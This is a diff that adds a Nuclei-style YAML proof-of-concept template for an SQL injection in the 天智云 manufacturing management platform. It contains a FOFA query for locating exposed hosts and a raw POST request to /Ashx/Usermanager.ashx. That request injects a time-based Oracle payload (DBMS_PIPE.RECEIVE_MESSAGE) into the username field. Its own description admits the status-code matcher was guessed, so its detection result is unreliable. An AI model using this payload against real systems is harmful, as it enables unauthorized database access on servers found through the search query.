@@ -1,0 +1,30 @@
+id: poc-2c49d7a19afeab18098b
+info:
+  name: 天智云制造管理平台存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/2c49d7a19afeab18098b6adbe68c0cc8
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 2c49d7a19afeab18098b6adbe68c0cc8
+    fofa: body="Ashx/Usermanager.ashx"
+http:
+- raw:
+  - 'POST /Ashx/Usermanager.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+
+    type=LOGIN&username=1'') AND 1566=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(90)||CHR(98)||CHR(107),5) AND (''DgMy''=''DgMy&pwd=123&vendor='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
